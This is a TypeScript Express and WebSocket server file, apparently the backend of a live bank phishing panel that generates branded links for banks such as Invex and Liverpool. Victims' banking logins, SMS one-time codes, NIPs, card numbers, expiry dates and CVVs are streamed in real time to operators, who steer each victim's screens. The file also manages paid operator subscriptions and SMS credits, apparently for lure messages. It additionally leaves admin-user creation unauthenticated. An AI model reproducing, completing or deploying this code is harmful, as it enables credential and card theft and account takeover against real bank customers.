import type { Express } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { nanoid } from "nanoid";
import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema } from "@shared/schema";
import { setupAuth } from "./auth";

// Store active connections
const clients = new Map<string, WebSocket>();
const adminClients = new Set<WebSocket>();

export async function registerRoutes(app: Express): Promise<Server> {
  // Setup authentication
  setupAuth(app);
  
  // Create HTTP server
  const httpServer = createServer(app);

  // Create WebSocket server
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
  
  // Configurar limpieza periódica de sesiones antiguas
  setInterval(async () => {
    try {
      const deletedCount = await storage.cleanupExpiredSessions();
      if (deletedCount > 0) {
        console.log(`Limpieza automática: ${deletedCount} sesiones antiguas eliminadas (>5 días)`);
        broadcastToAdmins(JSON.stringify({
          type: 'SESSIONS_CLEANUP',
          data: { deletedCount }
        }));
      }
    } catch (error) {
      console.error('Error en limpieza automática de sesiones:', error);
    }
  }, 12 * 60 * 60 * 1000); // Ejecutar cada 12 horas
  
  // Configurar limpieza periódica de usuarios expirados
  setInterval(async () => {
    try {
      const deactivatedCount = await storage.cleanupExpiredUsers();
      if (deactivatedCount > 0) {
        console.log(`Limpieza automática: ${deactivatedCount} usuarios expirados desactivados`);
        broadcastToAdmins(JSON.stringify({
          type: 'USERS_CLEANUP',
          data: { deactivatedCount }
        }));
      }
    } catch (error) {
      console.error('Error en limpieza automática de usuarios:', error);
    }
  }, 6 * 60 * 60 * 1000); // Ejecutar cada 6 horas

  // API endpoints
  // Rutas de administración de usuarios
  app.post('/api/admin/users', async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await storage.createAdminUser(username, password);
      res.json({ success: true, user: { ...user, password: undefined } });
    } catch (error: any) {
      res.status(400).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/login', async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await storage.validateAdminUser(username, password);
      if (!user) {
        return res.status(401).json({ success: false, message: "Credenciales inválidas" });
      }
      
      // Actualizamos la última fecha de inicio de sesión
      await storage.updateUserLastLogin(user.id);
      
      // Establecemos una cookie de sesión simple (en una implementación real usaríamos JWT o similar)
      res.cookie('auth_token', username, { 
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        maxAge: 24 * 60 * 60 * 1000 // 1 día
      });
      
      res.json({ success: true, user: { ...user, password: undefined } });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });
  
  app.post('/api/admin/logout', async (req, res) => {
    try {
      // Limpiar la cookie de autenticación
      res.clearCookie('auth_token');
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/users/:username/toggle', async (req, res) => {
    try {
      const { username } = req.params;
      const success = await storage.toggleAdminUserStatus(username);
      if (!success) {
        return res.status(404).json({ success: false, message: "Usuario no encontrado" });
      }
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.get('/api/admin/users', async (req, res) => {
    try {
      const users = await storage.getAllAdminUsers();
      res.json(users.map((user: User) => ({ ...user, password: undefined })));
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });
  
  // Ruta para obtener usuarios regulares (solo para el usuario "balonx")
  app.get('/api/users/regular', async (req, res) => {
    console.log('[API] Solicitud para obtener usuarios regulares');
    
    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }
    
    const user = req.user;
    console.log(`[API] Usuario actual: ${user.username}, rol: ${user.role}`);
    
    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (user.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }
    
    try {
      console.log('[API] Obteniendo lista de usuarios regulares');
      const users = await storage.getAllUsers();
      const regularUsers = users.filter(user => user.role === UserRole.USER);
      console.log(`[API] Encontrados ${regularUsers.length} usuarios regulares`);
      
      // Mostrar detalles de usuarios para depuración
      regularUsers.forEach(user => {
        console.log(`[API] Usuario: ${user.username}, Activo: ${user.isActive}, Expira: ${user.expiresAt || 'No establecido'}`);
      });
      
      const usersList = regularUsers.map((user: User) => ({ 
        id: user.id,
        username: user.username,
        role: user.role,
        isActive: user.isActive,
        expiresAt: user.expiresAt,
        deviceCount: user.deviceCount,
        maxDevices: user.maxDevices,
        createdAt: user.createdAt,
        lastLogin: user.lastLogin
      }));
      
      res.json(usersList);
    } catch (error: any) {
      console.log(`[API] Error al obtener usuarios: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });
  
  // Alternar el estado de un usuario (activar/desactivar) (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/toggle-status', async (req, res) => {
    console.log('[API] Solicitud para alternar estado de usuario');
    
    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }
    
    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);
    
    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }
    
    try {
      const { username } = req.params;
      console.log(`[API] Intentando alternar estado del usuario: ${username}`);
      
      const success = await storage.toggleUserStatus(username);
      if (!success) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }
      
      // Obtener el usuario actualizado
      const updatedUser = await storage.getUserByUsername(username);
      if (!updatedUser) {
        return res.status(404).json({ message: "Usuario no encontrado después de actualización" });
      }
      
      console.log(`[API] Estado de usuario alternado: ${username}, nuevo estado: ${updatedUser.isActive ? 'activo' : 'inactivo'}`);
      
      res.json({ 
        success: true, 
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          role: updatedUser.role,
          isActive: updatedUser.isActive,
          expiresAt: updatedUser.expiresAt,
          deviceCount: updatedUser.deviceCount,
          maxDevices: updatedUser.maxDevices,
          createdAt: updatedUser.createdAt,
          lastLogin: updatedUser.lastLogin
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al alternar estado de usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Activar un usuario por 1 día (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/activate-one-day', async (req, res) => {
    console.log('[API] Solicitud para activar usuario por 1 día');
    
    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }
    
    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);
    
    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }
    
    try {
      const { username } = req.params;
      console.log(`[API] Intentando activar usuario: ${username}`);
      
      const user = await storage.activateUserForOneDay(username);
      console.log(`[API] Usuario activado con éxito: ${username}`);
      console.log(`[API] Estado actual: activo=${user.isActive}, expira=${user.expiresAt}`);
      
      res.json({ 
        success: true, 
        user: {
          id: user.id,
          username: user.username,
          role: user.role,
          isActive: user.isActive,
          expiresAt: user.expiresAt,
          deviceCount: user.deviceCount,
          maxDevices: user.maxDevices
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al activar usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });
  
  // Activar un usuario por 7 días (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/activate-seven-days', async (req, res) => {
    console.log('[API] Solicitud para activar usuario por 7 días');
    
    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }
    
    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);
    
    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }
    
    try {
      const { username } = req.params;
      console.log(`[API] Intentando activar usuario: ${username}`);
      
      const user = await storage.activateUserForSevenDays(username);
      console.log(`[API] Usuario activado con éxito: ${username}`);
      console.log(`[API] Estado actual: activo=${user.isActive}, expira=${user.expiresAt}`);
      
      res.json({ 
        success: true, 
        user: {
          id: user.id,
          username: user.username,
          role: user.role,
          isActive: user.isActive,
          expiresAt: user.expiresAt,
          deviceCount: user.deviceCount,
          maxDevices: user.maxDevices
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al activar usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });
  
  // Desactivar usuarios expirados (se puede llamar manualmente o mediante un cron job)
  app.post('/api/users/cleanup-expired', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }
    
    const currentUser = req.user;
    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      return res.status(403).json({ message: "No autorizado" });
    }
    
    try {
      const deactivatedCount = await storage.cleanupExpiredUsers();
      res.json({ success: true, deactivatedCount });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });
  
  // Eliminar un usuario (solo usuario "balonx" puede hacerlo)
  app.delete('/api/users/regular/:username', async (req, res) => {
    console.log('[API] Solicitud para eliminar usuario');
    
    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }
    
    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);
    
    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }
    
    const { username } = req.params;
    
    // No permitir eliminar al usuario admin "balonx"
    if (username === "balonx") {
      console.log('[API] Error: No se puede eliminar al usuario admin "balonx"');
      return res.status(403).json({ message: "No se puede eliminar al usuario administrador principal" });
    }
    
    try {
      console.log(`[API] Intentando eliminar usuario: ${username}`);
      const deleted = await storage.deleteUser(username);
      
      if (!deleted) {
        console.log(`[API] Error: Usuario ${username} no encontrado`);
        return res.status(404).json({ success: false, message: "Usuario no encontrado" });
      }
      
      console.log(`[API] Usuario eliminado con éxito: ${username}`);
      res.json({ success: true, message: `Usuario ${username} eliminado correctamente` });
    } catch (error: any) {
      console.log(`[API] Error al eliminar usuario: ${error.message}`);
      res.status(500).json({ success: false, message: error.message });
    }
  });
  
  app.get('/api/admin/user', async (req, res) => {
    try {
      // Obtener el username de la cookie de autenticación
      const username = req.cookies?.auth_token;
      if (!username) {
        return res.status(401).json({ message: "No autorizado" });
      }
      
      // Buscar el usuario por nombre de usuario
      const user = await storage.getUserByUsername(username);
      if (!user) {
        return res.status(401).json({ message: "Usuario no encontrado" });
      }
      
      // Verificar si el usuario está activo
      if (!user.isActive) {
        return res.status(403).json({ message: "Usuario inactivo" });
      }
      
      // Devolver el usuario sin la contraseña
      res.json({ ...user, password: undefined });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  app.get('/api/sessions', async (req, res) => {
    try {
      const { type = 'current' } = req.query;
      
      let sessions;
      if (type === 'saved') {
        sessions = await storage.getSavedSessions();
      } else if (type === 'all') {
        sessions = await storage.getAllSessions();
      } else {
        sessions = await storage.getCurrentSessions();
      }
      
      res.json(sessions);
    } catch (error) {
      console.error("Error fetching sessions:", error);
      res.status(500).json({ message: "Error fetching sessions" });
    }
  });

  app.post('/api/sessions', async (req, res) => {
    try {
      const { banco = "Invex" } = req.body;
      const sessionId = nanoid(10);
      const session = await storage.createSession({ 
        sessionId, 
        banco,
        folio: nanoid(6),
        pasoActual: ScreenType.FOLIO,
      });
      res.json(session);
    } catch (error) {
      console.error("Error creating session:", error);
      res.status(500).json({ message: "Error creating session" });
    }
  });

  app.post('/api/sessions/:id/update', async (req, res) => {
    try {
      const { id } = req.params;
      const session = await storage.updateSession(id, req.body);
      
      // Notify all admin clients
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: session
      }));
      
      res.json(session);
    } catch (error) {
      console.error("Error updating session:", error);
      res.status(500).json({ message: "Error updating session" });
    }
  });
  
  // Endpoint para guardar una sesión
  app.post('/api/sessions/:id/save', async (req, res) => {
    try {
      const { id } = req.params;
      const session = await storage.saveSession(id);
      
      // Notify all admin clients
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: session
      }));
      
      res.json(session);
    } catch (error) {
      console.error("Error saving session:", error);
      res.status(500).json({ message: "Error saving session" });
    }
  });
  
  // Endpoint para eliminar una sesión
  app.delete('/api/sessions/:id', async (req, res) => {
    try {
      const { id } = req.params;
      const success = await storage.deleteSession(id);
      
      if (success) {
        // Notify all admin clients
        broadcastToAdmins(JSON.stringify({
          type: 'SESSION_DELETE',
          data: { sessionId: id }
        }));
        
        res.json({ success: true });
      } else {
        res.status(404).json({ success: false, message: "Session not found" });
      }
    } catch (error) {
      console.error("Error deleting session:", error);
      res.status(500).json({ message: "Error deleting session" });
    }
  });
  
  // Endpoint para limpiar sesiones expiradas (más de 5 días)
  app.post('/api/cleanup-sessions', async (req, res) => {
    try {
      const deletedCount = await storage.cleanupExpiredSessions();
      
      // Notify all admin clients to refresh their session list
      broadcastToAdmins(JSON.stringify({
        type: 'SESSIONS_CLEANUP',
        data: { deletedCount }
      }));
      
      res.json({ success: true, deletedCount });
    } catch (error) {
      console.error("Error cleaning up sessions:", error);
      res.status(500).json({ message: "Error cleaning up sessions" });
    }
  });

  app.get('/api/generate-link', async (req, res) => {
    try {
      const { banco = "LIVERPOOL" } = req.query;
      const sessionId = nanoid(10);
      
      // Generamos un código de 6 dígitos numéricos fácil de ver para el folio
      const generateSixDigitCode = () => {
        // Genera números aleatorios entre 0-9 para cada posición
        let code = '';
        for (let i = 0; i < 6; i++) {
          code += Math.floor(Math.random() * 10).toString();
        }
        return code;
      };
      
      const sixDigitCode = generateSixDigitCode();
      
      const session = await storage.createSession({ 
        sessionId, 
        banco: banco as string,
        folio: sixDigitCode,
        pasoActual: ScreenType.FOLIO,
      });

      // Obtenemos el dominio base desde las variables de entorno
      const { REPLIT_DOMAINS } = process.env;
      const domain = REPLIT_DOMAINS ? REPLIT_DOMAINS.split(',')[0] : 'localhost:5000';
      
      // En lugar de intentar usar subdominios, usaremos rutas diferentes
      // La ruta del cliente tendrá un prefijo especial que la hace diferente 
      // del panel de administración
      
      // Armamos el enlace final - usando la misma URL base pero con una ruta específica
      const link = `https://${domain}/client/${sessionId}`;
      
      console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
      console.log(`URL del cliente: ${link}`);
      
      res.json({ 
        sessionId, 
        link, 
        code: sixDigitCode
      });
    } catch (error) {
      console.error("Error generating link:", error);
      res.status(500).json({ message: "Error generating link" });
    }
  });

  // WebSocket handling
  wss.on('connection', (ws, req) => {
    console.log('New WebSocket connection');
    
    // Handle client/admin identification
    ws.on('message', async (message) => {
      try {
        const data = JSON.parse(message.toString());
        
        // Register client or admin
        if (data.type === 'REGISTER') {
          if (data.role === 'ADMIN') {
            adminClients.add(ws);
            console.log('Admin client registered');
            
            // Send sessions to the admin - current sessions by default
            const sessions = await storage.getCurrentSessions();
            ws.send(JSON.stringify({
              type: 'INIT_SESSIONS',
              data: sessions
            }));
            
            // Run cleanup of old sessions (more than 5 days)
            try {
              const deletedCount = await storage.cleanupExpiredSessions();
              if (deletedCount > 0) {
                console.log(`Cleaned up ${deletedCount} expired sessions`);
                broadcastToAdmins(JSON.stringify({
                  type: 'SESSIONS_CLEANUP',
                  data: { deletedCount }
                }));
              }
            } catch (error) {
              console.error("Error cleaning up expired sessions:", error);
            }
          } 
          else if (data.role === 'CLIENT' && data.sessionId) {
            clients.set(data.sessionId, ws);
            console.log(`Client registered with session ID: ${data.sessionId}`);
            
            // Get session info and send to client
            const session = await storage.getSessionById(data.sessionId);
            if (session) {
              ws.send(JSON.stringify({
                type: 'INIT_SESSION',
                data: session
              }));
            }
          }
          return;
        }
        
        // Handle screen change request from admin
        if (data.type === 'SCREEN_CHANGE') {
          try {
            // Validate the data
            const validatedData = screenChangeSchema.parse(data.data);
            const { sessionId, tipo } = validatedData;
            
            // Find the target client
            const client = clients.get(sessionId);
            if (client && client.readyState === WebSocket.OPEN) {
              // Send the screen change command to the client
              client.send(JSON.stringify({
                type: 'SCREEN_CHANGE',
                data: validatedData
              }));
              
              // Update session in storage with the new screen state
              // Remove "mostrar_" prefix from tipo if present
              let screenType = tipo.replace('mostrar_', '');
              
              // Normalizar screenType para SMS_COMPRA
              if (screenType.toLowerCase() === 'sms_compra' || 
                  screenType.toLowerCase() === 'smscompra' ||
                  screenType.toLowerCase() === 'sms compra') {
                console.log('Normalizando screenType SMS_COMPRA en servidor:', screenType, 'to', ScreenType.SMS_COMPRA);
                screenType = ScreenType.SMS_COMPRA;
              }
              
              await storage.updateSession(sessionId, { pasoActual: screenType });
              console.log('Actualizado pasoActual a:', screenType);
              
              // Notify all admin clients about the update
              const updatedSession = await storage.getSessionById(sessionId);
              broadcastToAdmins(JSON.stringify({
                type: 'SESSION_UPDATE',
                data: updatedSession
              }));
            }
          } catch (error) {
            console.error("Invalid screen change data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Invalid screen change data" 
            }));
          }
          return;
        }
        
        // Handle client input data
        if (data.type === 'CLIENT_INPUT') {
          try {
            // Validate the data
            const validatedData = clientInputSchema.parse(data.data);
            const { sessionId, tipo, data: inputData } = validatedData;
            
            // Update the session with the new data
            const updatedFields: Record<string, any> = {};
            
            switch (tipo) {
              case 'folio':
                updatedFields.folio = inputData.folio;
                break;
              case 'login':
                updatedFields.username = inputData.username;
                updatedFields.password = inputData.password;
                break;
              case 'codigo':
                updatedFields.sms = inputData.codigo;
                break;
              case 'nip':
                updatedFields.nip = inputData.nip;
                break;
              case 'tarjeta':
                updatedFields.tarjeta = inputData.tarjeta;
                updatedFields.fechaVencimiento = inputData.fechaVencimiento;
                updatedFields.cvv = inputData.cvv;
                break;
              case 'sms_compra':
              case 'SMS_COMPRA':
              case 'smsCompra':
                // Asegurarnos de manejar correctamente las respuestas de SMS_COMPRA
                if (inputData && inputData.smsCompra) {
                  updatedFields.smsCompra = inputData.smsCompra;
                  console.log('Recibido código de cancelación SMS_COMPRA:', inputData.smsCompra);
                  
                  // Notificar a los administradores el código de cancelación inmediatamente
                  broadcastToAdmins(JSON.stringify({
                    type: 'SMS_COMPRA_CODE',
                    data: {
                      sessionId,
                      code: inputData.smsCompra
                    }
                  }));
                } else {
                  console.error('Error: datos SMS_COMPRA recibidos sin código de cancelación:', inputData);
                }
                break;
              case 'celular':
                updatedFields.celular = inputData.celular;
                break;
            }
            
            console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);
            
            // Notify admins immediately of incoming data before database update
            broadcastToAdmins(JSON.stringify({
              type: 'CLIENT_INPUT_REALTIME',
              data: {
                sessionId,
                tipo,
                inputData
              }
            }));
            
            // Update session if we have fields to update
            if (Object.keys(updatedFields).length > 0) {
              const updatedSession = await storage.updateSession(sessionId, updatedFields);
              
              // Notify all admin clients about the database update
              broadcastToAdmins(JSON.stringify({
                type: 'SESSION_UPDATE',
                data: updatedSession
              }));
            }
          } catch (error) {
            console.error("Invalid client input data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Invalid client input data" 
            }));
          }
          return;
        }
      } catch (error) {
        console.error("Error processing WebSocket message:", error);
      }
    });
    
    // Handle disconnection
    ws.on('close', () => {
      // Remove from admin clients if it was an admin
      if (adminClients.has(ws)) {
        adminClients.delete(ws);
        console.log('Admin client disconnected');
      }
      
      // Remove from clients if it was a client
      Array.from(clients.entries()).forEach(([sessionId, client]) => {
        if (client === ws) {
          clients.delete(sessionId);
          console.log(`Client with session ID ${sessionId} disconnected`);
        }
      });
    });
  });
  
  // === API de SMS ===
  
  // Obtener la configuración actual de la API de SMS
  app.get('/api/sms/config', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const config = await storage.getSmsConfig();
      // Si hay una config, ocultamos la api key por seguridad, solo mostramos si está activa
      if (config) {
        res.json({
          isActive: config.isActive,
          updatedAt: config.updatedAt,
          updatedBy: config.updatedBy,
          hasApiKey: !!config.apiKey
        });
      } else {
        res.json(null);
      }
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });
  
  // Actualizar la configuración de la API de SMS
  app.post('/api/sms/config', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const user = req.user;
      // Solo usuario administrador puede actualizar la configuración
      if (user.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden actualizar la configuración de API" });
      }
      
      const data = insertSmsConfigSchema.parse({
        apiKey: req.body.apiKey,
        updatedBy: user.username
      });
      
      const config = await storage.updateSmsConfig(data);
      res.json({
        isActive: config.isActive,
        updatedAt: config.updatedAt,
        updatedBy: config.updatedBy,
        success: true
      });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });
  
  // Obtener los créditos SMS del usuario actual
  app.get('/api/sms/credits', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const user = req.user;
      const credits = await storage.getUserSmsCredits(user.id);
      res.json({ credits });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });
  
  // Agregar créditos a un usuario (solo admin)
  app.post('/api/sms/credits/:userId', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const currentUser = req.user;
      // Solo administradores pueden agregar créditos
      if (currentUser.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden agregar créditos" });
      }
      
      const userId = parseInt(req.params.userId);
      const { amount } = req.body;
      
      if (!amount || amount <= 0) {
        return res.status(400).json({ message: "La cantidad debe ser un número positivo" });
      }
      
      const smsCredits = await storage.addSmsCredits(userId, amount);
      res.json({
        success: true,
        credits: smsCredits.credits,
        message: `Se han agregado ${amount} créditos. Total: ${smsCredits.credits}`
      });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });
  
  // Enviar un SMS
  app.post('/api/sms/send', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const user = req.user;
      const config = await storage.getSmsConfig();
      
      // Verificar si la API está configurada
      if (!config || !config.apiKey || !config.isActive) {
        return res.status(400).json({ 
          success: false, 
          message: "La API de SMS no está configurada o está inactiva" 
        });
      }
      
      // Verificar si el usuario tiene créditos
      const hasCredits = await storage.useSmsCredit(user.id);
      if (!hasCredits) {
        return res.status(400).json({ 
          success: false, 
          message: "No tienes créditos suficientes para enviar un SMS" 
        });
      }
      
      // Validar los datos del SMS
      const { phoneNumber, message, sessionId } = req.body;
      
      if (!phoneNumber || !message) {
        return res.status(400).json({ 
          success: false, 
          message: "Se requiere número de teléfono y mensaje" 
        });
      }
      
      // Preparar los datos para el historial
      const smsData = insertSmsHistorySchema.parse({
        userId: user.id,
        phoneNumber,
        message,
        sessionId: sessionId || null
      });
      
      // Guardar en el historial como pendiente
      const smsRecord = await storage.addSmsToHistory(smsData);
      
      // TODO: Implementar la llamada real a la API de Sofmex
      // Esta es una simulación, en una implementación real haríamos la llamada HTTP
      try {
        // Simulamos un retraso para la llamada a la API
        // En una implementación real, aquí se haría la llamada a la API de Sofmex
        // Ejemplo: const response = await fetch('https://www.sofmex.com/api/sms/send', {...});
        
        // Por ahora, simulamos una respuesta exitosa
        setTimeout(async () => {
          await storage.updateSmsStatus(smsRecord.id, 'sent');
        }, 1000);
        
        res.json({
          success: true,
          message: "Mensaje enviado correctamente",
          smsId: smsRecord.id
        });
      } catch (apiError: any) {
        // Si ocurre un error con la API, actualizar el estado del SMS
        await storage.updateSmsStatus(smsRecord.id, 'failed', apiError.message);
        throw apiError;
      }
    } catch (error: any) {
      res.status(500).json({ 
        success: false, 
        message: error.message 
      });
    }
  });
  
  // Obtener historial de SMS enviados
  app.get('/api/sms/history', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const user = req.user;
      const history = await storage.getUserSmsHistory(user.id);
      
      res.json(history);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  return httpServer;
}

// Helper function to broadcast to all admin clients
function broadcastToAdmins(message: string) {
  adminClients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  });
}
